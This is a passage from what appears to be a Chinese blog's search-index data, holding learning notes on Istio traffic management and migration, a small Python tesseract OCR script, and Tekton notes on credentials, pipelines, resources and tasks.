v3子集。配置仅对网格内生效(被注入的pdo)，外部流量进来还是按照k8s的流量路线走。(对外生效可能需要配置gateways,后续学习测试) 建议添加一个无条件或者基于权重的规则,作为VirtualService的最后一条规则,从而确保流量至少能匹配一条路由规则。 总结: VirtualService指定匹配规则，将匹配的规则路由到不同的服务或不同服务的子集。 vs功能列举: 故障注入、设置跨域策略、设置请求头、流量镜像、重试策略、重定向、url重写、匹配规则、路由、 猜想: vs控制的是envoy sidecar的配置， gateway控制的是istio-ingressgateway的配置 DestinationRule 在经过vs路由时,如果配置了subset则会遵循DestinationRule配置的流量执行策略，如service的子集、熔断、负载均衡策略、连接池大小 和 健康检查(驱逐负载均衡池中不健康的主机) 具体配置可以查看官方文档示例 Gateway Gateway资源允许外部流量进入Istio服务网格，Gateway资源是在ingressgateway后方，在egressgateway的前方，所以流量从外部进入网格后会和Gateway资源匹配,用于控制接受什么样的流量(比如某个域名或者某种协议). virtualservice资源和Gateway可以做绑定，这样Gateway就可以对外部流量进行路由规则匹配，从而发往相应的服务。 除了进入网格的流量可以控制，我们也可以控制和过滤离开网格的流量。 ** 主要功能总结 ** Gateway允许指定L4-L6的设置：端口及TLS设置 对于L7的功能，Istio允许将VirtualService与Gateway绑定起来,通过virtualservice来提供能力 分离的好处：用户可以像使用传统的负载均衡设备一样管理进入网格内部的流量，绑定虚拟IP到虚拟服务器上 。便于传统技术用户无缝迁移到微服务 ** 字段介绍 ** selector选择你的流量入口网关pod servers 配置哪些流量可以进入gateway hosts 配置的是可以通过哪些域名访问到gateway port 配置可以通过哪些端口访问到gateway(测试下来可以写gateway service的port和targetPort) ServiceEntry Sidecar ","date":"2021-09-12 01:04","objectID":"/post/2648/:2:1","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"可观测性: kiali通过istio_requests_total{destination_service_name = “productpage”}指标获取实时数据并绘制图形 ","date":"2021-09-12 01:04","objectID":"/post/2648/:3:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"Istio流量走向逻辑 ","date":"2021-09-12 01:04","objectID":"/post/2648/:4:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"Istio诊断排错相关 配置完gw、vs、dr后访问出现404 检查网关配置，确认gw的hosts和协议端口号信息正确后、检查vs的hosts和gateways(注意当gw在不同namespace时需要指定gw的namespace.例如: istio-system/public-gateway) 修改envoy sidecar日志级别istioctl proxy-config log ingress-nginx-controller-66c6bdcc4b-zpwkj.ingress-nginx --level http:debug ","date":"2021-09-12 01:04","objectID":"/post/2648/:5:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"使用Istio注意点 pod中的标签需要包含app和version这两个标签 在service中要给端口命名(以http、http2、grpc、mongo、redis这种开头，但是不使用这些，实际测试中未发现问题，不知道作用在哪) 协议选择 ","date":"2021-09-12 01:04","objectID":"/post/2648/:6:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"迁移注意点 老的服务如果使用了http健康检查(liveness、readiness、startup)，istio中开启了服务间TLS加密通信。会导致k8s probe无限失败，pod会无限重启。因为kubelet发往业务容器的流量会被istio-proxy劫持。 网关迁移(南北向流量) 改动ingress方式 将目前所有ingress的后端指向istio-ingressgateway。需要改动大量ingress配置。日志收集也需要改动。 流量走向 client–\u003eslb–\u003eingress-nginx-controller–\u003eistio-ingressgateway–\u003eenvoy 使用istio-ingressgateway 需要迁移loadbalance，将原slb的地址迁移到istio网关的svc上。老服务会停机 日志收集可能需要改动。流量走向client–\u003eslb–\u003eistio-ingressgateway–\u003eenvoy 注入方式使用ingress-nginx-controller作为网关 istio注入enovy将nginx-controller变成网格内,理论上讲几乎无需改动(还没测试过),只需滚动升级nginx-controller。流量走向client–\u003eslb–\u003eingress-nginx-controller–\u003eenvoy ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"灰度发布 使用双deployment方式 事先准备virtualservice和destinationrule，定义当前流量全部流向当前线上版本 获取老版本的Deployment版本，例如job-v1 创建新版本的Deployment，例如job-v2 修改destinationrule中子集的label selector，配置service的两个子集(线上版本和新版本) 修改virtualservice, 配置灰度策略。可以是header、权重、cookie等 kiali观察流量和运行状态，监控观察日志和pod负载 观察正常后，修改virtualservice，将流量切到job-v2。 删除job-v1相关资源 ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:1","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"悟道 怎么才算网格内？ pod包含envoy sidecar代理。(不知对不对) 如何实现nginx-ingress-controller + istio。 目前想的是把envoy sidecar注入到nginx-ingress-controller将它变成网格内(后面已经实现，可跳到最后) gateway配置的TCP端口，会在istio-ingressgateway pod中开启， 但是需要手动暴露这个端口，需要修改svc或者添加svc。 virtualService超时？ http.timeout下配置，表示当前服务向其他服务请求的超时时间。比如当前服务是A，设置超时为5s。A在请求B服务时，如果B服务响应时间超过5s,那么A服务会返回给客户端504 Gateway Timeout. 其实是envoy sidecar请求其他服务时的超时时间,最终的504也是envoy返回的。 virtualService故障注入 设置当前服务的延迟或者中断。 延迟：延迟N秒后envoy代理将请求发送至业务服务。 中断：envoy直接处理客户端请求，可以设置响应状态码。 ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:2","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"未知领域 双向TLS通信 kiali为什么要对接grafana Istio CNI插件是什么，为什么需要(代替了istio-init容器所实现的功能) ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:3","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"探索与未来 ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:4","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"渡劫 vs中配置了gateways后，通过内部访问时(其他pod中)，vs规则失效了(变成轮询了)，删除了就恢复正常。(猜测是绑定了gateway后,只有通过网关的流量才会生效vs配置的路由规则所以绑定gateway要慎重) 总结: 内部调用的时候vs不配置gateways，外部调用才配置gateways。 后面在文档中发现需要在gateways中添加mesh，表示网格内也会生效，所以要同时生效的话需要加这个。 annotation解释 https://istio.io/v1.9/zh/docs/reference/config/annotations/ 准备: 创建额外的nginx-controller(防止影响现有ingress) https://help.aliyun.com/document_detail/151524.html?spm=5176.21213303.J_6028563670.21.374e3edahOhK8h\u0026scm=20140722.S_help%40%40%E6%96%87%E6%A1%A3%40%40151524.S_0%2Bos0.ID_151524-RL_nginxDAScontroller-OR_helpmain-V_2-P0_3 给nginx-controller注入sidecar sidecar.istio.io/inject: ’true' 让nginx处理入口流量 traffic.sidecar.istio.io/includeInboundPorts: \"\" # 将指定端口的流量重定向到envoy sidecar traffic.sidecar.istio.io/excludeInboundPorts: “80,443” # 将指定端口的流量不重定向到envoy sidecar traffic.sidecar.istio.io/excludeOutboundIPRanges: “10.1.0.1” # 将指定ip范围的流量不重定向到envoy sidecar。k get svc kubernetes -o jsonpath='{.spec.clusterIP}' 修改ingress配置 # 注意这是在Ingress资源中配置的 nginx.ingress.kubernetes.io/service-upstream: “true” # 默认nginx是将流量直接打到pod ip中的,而不是通过service ip。这个配置用来禁用它，使他的流量发往service ip，这样做的目的是让envoy sidecar更好的接管流量 nginx.ingress.kubernetes.io/upstream-vhost: “xxx.default.svc.cluster.local” # 这里写的是后端Service的完整fqdn。目的是修改Host请求头的值。这样的话vs对象配置的hosts就能匹配上了。 设置nginx-controller的envoy sidecar配置 这里还不是太了解、简单了解了一下，大概意思是控制nginx-controller的envoy sidecar发出的流量只允许发到哪些namespace或service。 我测试下来没有配置这个，nginx-controller+istio集成跑通了,应该是默认全允许。后面需要单独了解一下。 apiVersion: networking.istio.io/v1alpha3 kind: Sidecar metadata: name: ingress namespace: ingress-namespace spec: egress: - hosts: # only the frontend service in the prod-us1 namespace - \"prod-us1/frontend.prod-us1.svc.cluster.local\" # any service in the prod-apis namespace - \"prod-apis/*\" # tripping hazard: make sure you include istio-system! - \"istio-system/*\" ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:5","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["python"],"content":" #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:ocr-code.py @time:2021/08/26 \"\"\" from PIL import Image import requests import pytesseract import os # 下载图片 header = {'user-agent': 'xxx'} img = requests.get('https://xxx.xxx/f636a042.png', headers=header).content # 保存图片 with open('resources/hotline.png', 'wb') as f: f.write(img) # 图片灰度处理 im = Image.open('resources/hotline.png') x, y = im.size try: p = Image.new('RGBA', im.size, (0, 0, 0)) p.paste(im, (0, 0, x, y), im) p.save('resources/hotline.png') except: pass im = Image.open('resources/hotline.png') im = im.convert(\"L\") # im.save('resources/hotline.jpg') res = pytesseract.image_to_string(im, config='--psm 6 -c tessedit_char_whitelist=1234567890') print(res) os.remove(\"resources/hotline.png\") ","date":"2021-08-27 00:57","objectID":"/post/2644/:0:0","tags":["python"],"title":"tesseract识别简单数字图片","uri":"/post/2644/"},{"categories":["kubernetes","devops"],"content":"在使用多个workspace并且使用不同的pvc时会出现这个报错。 taskrun more than one PersistentVolumeClaim is bound 解决方法: k edit -n tekton-pipelines cm feature-flags 将disable-affinity-assistant参数改为\"true\" github issues: https://github.com/tektoncd/pipeline/issues/3480 ","date":"2021-08-24 18:08","objectID":"/post/2642/:0:0","tags":["k8s","tekton"],"title":"tekton-报错Taskrun more than one PersistentVolumeClaim is bound","uri":"/post/2642/"},{"categories":["kubernetes","devops"],"content":"参考文档: https://tekton.dev/docs/pipelines/auth ","date":"2021-08-24 13:55","objectID":"/post/2638/:0:0","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"使用背景: 在dind或者dood模式下,我们会运行一个docker client用于从Dockerfile构建镜像,如果dockerfile中的基础镜像需要登陆，并且构建完的镜像需要push到另一个仓库，那么这时候就需要两个仓库凭证。另外如果我们要运行的容器本身也需要去仓库拉一个镜像,那么这时候就需要三个凭证了。如果我们还需要用到git clone代码呢，又得加一个ssh ","date":"2021-08-24 13:55","objectID":"/post/2638/:1:0","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"annotation annotation必须以tekton.dev/git或tekton.dev/docker开头，值就是仓库的主机名，需要携带http/https。 对于ssh类型的只需要填写host名称，无需携带协议名，如果ssh类型的端口不是默认值，可以写成host:port这种形式 ","date":"2021-08-24 13:55","objectID":"/post/2638/:2:0","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"密码相同的情况 不管是git还是docker，如果密码相同配置起来比较简单。 apiVersion: v1 kind: Secret metadata: name: ci-auth annotations: tekton.dev/git-0: https://github.com tekton.dev/git-1: https://gitlab.com tekton.dev/docker-0: https://gcr.io type: kubernetes.io/basic-auth stringData: username: aaa password: aaa annotations部分需要注意。作用主要是用于区分我们定义的用户名密码可以用于哪个仓库地址，由于annotation的key不能相同，所有使用git-0，git-1来表示多个仓库地址。最终的含义: 用户名aaa密码aaa的这个账户可以登陆github、gitlab、gcr。 tekton最终不是用的Secret，而是用的ServiceAccount,所以我们需要创建一个ServiceAccount来引用这个Secret，如下 apiVersion: v1 kind: ServiceAccount metadata: name: ci-auth secrets: - name: ci-auth imagePullSecrets: - name: xxx 这个Secret中我们多写了imagePullSecrets，这个在拉取容器本身是使用。和pod中的imagePullSecret一样 ","date":"2021-08-24 13:55","objectID":"/post/2638/:3:0","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"不同密码的情况: # 用于登陆https://gcr.io、https://docker.io的镜像仓库凭证 apiVersion: v1 kind: Secret metadata: name: test0 annotations: tekton.dev/docker-0: https://gcr.io tekton.dev/docker-1: https://docker.io type: kubernetes.io/basic-auth stringData: username: test0 password: test0 --- # 用于登陆https://my.io的镜像仓库凭证 apiVersion: v1 kind: Secret metadata: name: test1 annotations: tekton.dev/docker-0: https://my.io type: kubernetes.io/basic-auth stringData: username: test1 password: test1 --- # 用于登陆mygit.com的git仓库凭证 apiVersion: v1 kind: Secret metadata: name: test2 annotations: tekton.dev/git: mygit.com type: kubernetes.io/basic-auth stringData: username: test2 password: test2 --- # 用于登陆mygit2.com的git仓库凭证(ssh-key) apiVersion: v1 kind: Secret metadata: name: test3 annotations: tekton.dev/git: mygit.com type: kubernetes.io/ssh-auth data: ssh-privatekey: base64后的ssh-key --- apiVersion: v1 kind: ServiceAccount metadata: name: test secrets: - name: test0 - name: test1 - name: test2 - name: test3 imagePullSecrets: - name: xxx ","date":"2021-08-24 13:55","objectID":"/post/2638/:4:0","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"背后做了什么？ ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:0","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"基于basic-auth类型的git 可以看到是写了两个文件到家目录 === ~/.gitconfig === [credential] helper = store [credential \"https://url1.com\"] username = \"user1\" [credential \"https://url2.com\"] username = \"user2\" ... === ~/.git-credentials === https://user1:pass1@url1.com https://user2:pass2@url2.com ... ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:1","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"基于ssh类型的git https://tekton.dev/docs/pipelines/auth/#ssh-auth-for-git === ~/.ssh/id_key1 === {contents of key1} === ~/.ssh/id_key2 === {contents of key2} ... === ~/.ssh/config === Host url1.com HostName url1.com IdentityFile ~/.ssh/id_key1 Host url2.com HostName url2.com IdentityFile ~/.ssh/id_key2 ... === ~/.ssh/known_hosts === {contents of known_hosts1} {contents of known_hosts2} ... ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:2","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"基于basic-auth的docker === ~/.docker/config.json === { \"auths\": { \"https://url1.com\": { \"auth\": \"$(echo -n user1:pass1 | base64)\", \"email\": \"not@val.id\", }, \"https://url2.com\": { \"auth\": \"$(echo -n user2:pass2 | base64)\", \"email\": \"not@val.id\", }, ... } } ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:3","tags":["k8s","devops","tekton"],"title":"tekton-配置认证凭证","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"概述 pipeline由一个或多个task对象组成,并可以按照特定的顺序执行,pipeline只是定义的作用,不会真正的运行,运行需要pipelinerun对象。 官方文档: https://tekton.dev/vault/pipelines-v0.18.1/pipelines ","date":"2021-08-22 21:21","objectID":"/post/2632/:1:0","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"一、对象属性 必须: apiVersion - tekton.dev/v1beta1. kind - Pipeline metadata - 略 spec - pipeline对象的详细配置 tasks - 指定组成pipeline的task及其执行的详细信息 可选: resources - 声明当前pipeline所需的资源，由pipelinerun提供具体内容，在tasks中的任务可以指定使用这个资源 workspaces - 声明当前pipeline所需的workspace params - 声明当前pipeline所需的参数 results - task可以在执行后配置results。pipeline可以使用这些results finally - 指定要在所有task执行完成后需要并行执行的一个或多个任务。 ","date":"2021-08-22 21:21","objectID":"/post/2632/:2:0","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"二、常见属性介绍 ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:0","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"resources/workspaces/params 在pipeline中不仅可以直接给task提供参数(见下面的tasks介绍)，还可以通过声明的方式向pipelinerun来索要,然后在tasks中给它们赋值,注意params需要使用变量替换的方式，workspace和resource可以直接使用声明的名称。例子如下: spec: resources: - name: code # 需要pr给我们传一个git类型的资源 type: git workspaces: - name: dockerconfig # 需要pr给我们传一个工作空间(可选) optional: true params: - name: image # 需要pr给我们传一个image参数 tasks: - name: build-the-image taskRef: name: build-push workspaces: - name: dockerconfig # 引用上面声明的dockerconfig workspace，传递给task中的dockerconfig workspace workspace: dockerconfig params: - name: pathToDockerFile value: Dockerfile - name: pathToContext value: /workspace/examples/microservices/leeroy-web - name: image value: $(params.image) # 引用上面声明的image参数，传递给task中的image参数 resources: inputs: - name: my-repo # 引用上面声明的code resource，传递task中input类型的my-repo resource resource: code 先声明在引用 ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:1","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"tasks tasks用于指定当前pipeline中包含哪些task,以及一些运行规则等等。 1.params、resources、workspaces 提供task需要的运行参数、资源。可以像下面这样配置 spec: tasks: - name: build-the-image taskRef: name: build-push params: - name: pathToDockerFile value: Dockerfile - name: pathToContext value: /workspace/examples/microservices/leeroy-web resources: inputs: - name: workspace resource: my-repo outputs: - name: image resource: my-image 2.from 如果pipeline中的task需要使用前一个task的输出作为输入,from也可以达到控制task执行顺序的效果 - name: build-app taskRef: name: build-push resources: outputs: - name: image resource: my-image - name: deploy-app taskRef: name: deploy-kubectl resources: inputs: - name: image resource: my-image from: - build-app 部署task需要在构建镜像task之后执行。可以看到给部署task提供input资源，是从构建镜像task的输出中获取的。 from是个数组类型,可以指定多个task来控制顺序，但resource获取的是最后一个task的。(我的猜测) 3.runAfter 表示当前任务在某任务执行后开始执行，也是用于控制task的执行顺序的。 - name: test-app taskRef: name: make-test - name: build-app taskRef: name: kaniko-build runAfter: - test-app build-app在test-app之后执行 4.retries 指定某个task在执行失败后重试的次数 tasks: - name: build-the-image retries: 1 taskRef: name: build-push 4.When when表达式可以用来判断task是否要执行。 when中可以使用 Input: 是when表达式的输入，它可以是静态内容或变量（params或results）。如果未提供输入，则默认为空字符串。 Operator: 运算符。可用in和notin Values: 一个字符串值数组,必须提供数组值，并且该数组不能为空。它可以使用静态内容或变量（params、results或工作区的绑定状态） 下面是示例: tasks: - name: first-create-file when: # 当参数path的值是README.md才会运行这个task - input: \"$(params.path)\" operator: in values: [\"README.md\"] taskRef: name: first-create-file --- tasks: - name: echo-file-exists when: # 当check-file任务的结果中exists的值是yes，才会运行这个task - input: \"$(tasks.check-file.results.exists)\" operator: in values: [\"yes\"] taskRef: name: echo-file-exists --- tasks: - name: run-lint when: # 如果pipelinerun提供了lint-config workspace则会运行这个task - input: \"$(workspaces.lint-config.bound)\" # 工作区是否绑定，就是pipelinerun是否提供了workspace卷。 operator: in values: [\"true\"] taskRef: name: lint-source 可以定义一些用于检查的task,将结果给result,再通过result来决定是否要运行当前task ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:2","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"resources pipeline需要用pipelineresource为组成它的task提供输入和输出 spec: resources: - name: my-repo type: git - name: my-image type: image ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:3","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"results 有两种用法,在使用 1.在pipeline中的task可以调用另外一个task的result，使用方法$(tasks.\u003ctask-name\u003e.results.\u003cresult-name\u003e)。由于存在这种调用关系，就需要有先后执行顺序，在使用了result引用后，tekton会确保被引用的task先执行。 例如： 在下面的配置中,从checkout-source这个task中获取commit结果。 Tekton 将确保 checkout-source 任务在build任务之前运行。 tasks: - name: build taskRef: name: build params: - name: foo value: \"$(tasks.checkout-source.results.commit)\" 注意: 如果checkout-source没有将结果写入result，那么build这个task就找不到commit这个结果了,最终Pipeline失败并显示 InvalidTaskResultReference: unable to find result referenced by param 'foo' in 'task';: Could not find result with name 'commit' for task run 'checkout-source' 2. 将task的result作为pipeline的result，也可以组合多个result作为pipeline的result。最终的结果可以在pipelinerun的status.pipelineResults字段看到 例如: 第一个sum表示将task calculate-sum的outputValue结果，作为pipelinerun的result 第二个all-sum表示将两个结果组合在一起,注意不是相减是字符串的组合。 spec: results: - name: sum description: the sum of all three operands value: $(tasks.calculate-sum.results.outputValue) - name: all-sum value: $(tasks.second-add.results.sum)-$(tasks.first-add.results.sum) ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:4","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"finally 指定要在所有task执行完成后需要并行执行的一个或多个任务。 finally task与task非常相似，并遵循相同的语法。 注意点: finally task会影响pipelinerun的运行状态。 在finally的task中不能使用from 不能控制执行顺序 不能使用条件语句 暂时不支持从task中获取result，即不能使用$(tasks.checkout-source.results.commit) ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:5","tags":["k8s","devops","tekton"],"title":"tekton学习-pipeline资源对象(三) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"概述 PipelineResources是给Task提供输入和输出的资源对象。 一个Task可能会有多个输入和输出: Task的输入可以是GitHub代码仓库 Task的输出可以是一个要上传到镜像仓库的容器镜像 Task的输出可以是一个要上传到存储桶的jar包 PipelineResources一直处于alpha版本,随时可能会被抛弃,官方也给了一些替代它的方案,在这里 为什么可能会被抛弃？ ","date":"2021-08-21 23:23","objectID":"/post/2628/:1:0","tags":["k8s","devops","tekton"],"title":"tekton学习-PipelineResources对象(一)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"一、PipelineResources对象支持的属性 必须: apiVersion - tekton.dev/v1alpha1. kind - PipelineResource metadata - 略 spec - PipelineResource对象的详细配置 type - PipelineResource的类型,可选git、pullRequest、image、cluster、storage、cloudEvent 可选: description - 资源描述 params - 在选择不同的资源类型时,在这里指定其参数名称和值。比如git需要名为url和revision参数 secrets - 当参数中的值需要脱敏时,可以使用secret代替params。配置示例 ","date":"2021-08-21 23:23","objectID":"/post/2628/:2:0","tags":["k8s","devops","tekton"],"title":"tekton学习-PipelineResources对象(一)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"二、配置示例 ","date":"2021-08-21 23:23","objectID":"/post/2628/:3:0","tags":["k8s","devops","tekton"],"title":"tekton学习-PipelineResources对象(一)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"1.配置git资源 apiVersion: tekton.dev/v1alpha1 kind: PipelineResource metadata: name: website-git spec: type: git params: - name: url value: https://github.com/tektoncd/website - name: revision value: main 定义了git仓库地址和git分支 ","date":"2021-08-21 23:23","objectID":"/post/2628/:3:1","tags":["k8s","devops","tekton"],"title":"tekton学习-PipelineResources对象(一)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"2.配置容器镜像资源 apiVersion: tekton.dev/v1alpha1 kind: PipelineResource metadata: name: website-image spec: type: image params: - name: url value: cr.io/website 定义镜像仓库地址,tag不写代表latest ","date":"2021-08-21 23:23","objectID":"/post/2628/:3:2","tags":["k8s","devops","tekton"],"title":"tekton学习-PipelineResources对象(一)","uri":"/post/2628/"},{"categories":["kubernetes","devops"],"content":"概述 Task包含一系列step，每个step就是一个容器，这些step会按照定义的顺序执行,当一个step执行失败后，后续的容器不会执行。Task在Kubernetes集群上作为Pod执行。Task在特定的命名空间中可用，而ClusterTask在整个集群中可用。 ","date":"2021-08-19 22:21","objectID":"/post/2627/:1:0","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"一、task对象支持的属性 https://tekton.dev/vault/pipelines-v0.18.1/tasks/#configuring-a-task 必须: apiVersion - api版本,例如: tekton.dev/v1beta1. kind - 定义的资源类型,这里是Task metadata - 元数据,包括name、lables、annotations等 spec - 定义Task资源对象的详细配置信息。 steps - 定义执行具体操作的容器信息 可选: description - task的描述信息 params - 定义task的执行参数，例如编译参数或制品名称。参数可以在task中设置默认值也可以通过TaskRun传递，通过$(params.xxx)可以使用参数值 resources - 定义task需要的资源(PipelineResources) inputs - 定义需要的输入资源，例如源代码。需要taskrun提供 outputs - 定义需要的输出资源，例如容器镜像。需要taskrun提供 workspaces - 定义一个workspace卷,在运行task时必须要提供一个workspace卷,我们可以用这个卷进行持久化,这个卷是针对task中的所有容器的。如果不指定mountPath,则默认挂载到/workspace/ 中 results - 这个可以用于step运行结果的传递。具体请看下面的results测试 volumes - 定义卷，我理解它和Pod的volumes一样。volumes和workspaces不同的是可以选择不同的容器进行挂载。可以通过steps[0].volumeMount.xx来配置。 stepTemplate - 定义task中所有step(容器)共有的属性,这样每个step可以直接继承属性，而不用在每个容器中都写一遍 sidecars - sidecars可以定义容器，这些容器会在step定义的容器之前运行,有Probe的情况下，会阻塞step容器的启动 ","date":"2021-08-19 22:21","objectID":"/post/2627/:2:0","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"二、小技巧 ","date":"2021-08-19 22:21","objectID":"/post/2627/:3:0","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"1.script step中有个script字段,内容作为脚本运行，并且可以通过args传参。例如： ... spec: steps: - name: one image: curlimages/curl:7.77.0 script: | #!/bin/sh echo \"Hello $1!\" args: - \"soulchild\" ","date":"2021-08-19 22:21","objectID":"/post/2627/:3:1","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"2.api文档 我在写yaml的时候喜欢对照api文档来写，但是tekton的官网没找到api文档。最后找到一个折中的办法。在tekton的git仓库发现了swagger.json，然后利用swagger-ui读取，也可以呈现出api文档。 首先打开swagger-demo: https://petstore.swagger.io/ 然后将后面这个地址放进去读取就可以了https://raw.githubusercontent.com/tektoncd/pipeline/main/pkg/apis/pipeline/v1beta1/swagger.json ","date":"2021-08-19 22:21","objectID":"/post/2627/:3:2","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"三、一些属性测试 ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:0","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"3.1 workspace apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: workspace-test spec: steps: - name: wsp-test1 image: busybox:stable script: | #!/bin/sh ls -ld $(workspaces.wsp-test.path) ls $(workspaces.wsp-test.path) echo 'Hello World' \u003e $(workspaces.wsp-test.path)/content.txt ls $(workspaces.wsp-test.path) cat $(workspaces.wsp-test.path)/content.txt - name: wsp-test2 image: busybox:stable script: | #!/bin/sh ls -ld $(workspaces.wsp-test.path) ls $(workspaces.wsp-test.path) echo 'Hello World' \u003e $(workspaces.wsp-test.path)/content.txt ls $(workspaces.wsp-test.path) cat $(workspaces.wsp-test.path)/content.txt workspaces: - name: wsp-test description: \"测试workspace\" mountPath: /wp-test/a/b/c 使用workspaces定义了一个工作空间,表示要运行这个task必须要提供一个workspace，下面定义一个taskrun apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: workspace-test spec: taskRef: name: workspace-test workspaces: - name: wsp-test volumeClaimTemplate: spec: storageClassName: managed-nfs-storage accessModes: - ReadWriteOnce resources: requests: storage: 1Gi 在这里提供了workspace是一个pvc模板,也支持其他的类型,如: persistentVolumeClaim、emptyDir、configMap、secret、 上面的例子中的执行结果,可以看到两个step的/wp-test/a/b/c是同一个目录,需要注意的是使用volumeClaimTemplate每次都会重新创建pvc,pv也会相应的被重新创建。 80770-r414xrzn63s.png ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:1","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"3.2 stepTemplate apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: hello namespace: default spec: steps: - args: - soulchild image: curlimages/curl:7.77.0 name: one script: | #!/bin/sh date +%s echo \"Hello $1! $myname\" - command: - /bin/sh - -c - \"echo Hello World! $myname \u0026\u0026 date +%s\" image: curlimages/curl:7.77.0 name: hello - command: - /bin/sh - -c - \"echo my name is $myname \u0026\u0026 date +%s\" image: curlimages/curl:7.77.0 name: soulchild stepTemplate: env: - name: myname value: soulchild 这个task中所有的step都会包含myname这个变量 ","date":"2021-08-19 22:21","objectID":"/post/2627/:4:2","tags":["devops","tekton"],"title":"tekton学习-task资源对象(二)","uri":"/post/2627/"},{"categories":["kubernetes","devops"],"content":"3.3 resutls 这里参考catalog hub中的一个例子 apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: generate-build-id spec: params: - name: base-version description: Base product version type: string default: \"1.0\" results: - name: timestamp description: Current timestamp - name: build-id description: ID of the current build steps: - name: get-timestamp image: docker.io/library/bash:5.0.18@sha256:8ef3f8518f47caf1ddcbdf49e983a9a119f9faeb41c2468dd20ff39cd242d69d #tag: 5.0.18 script: | 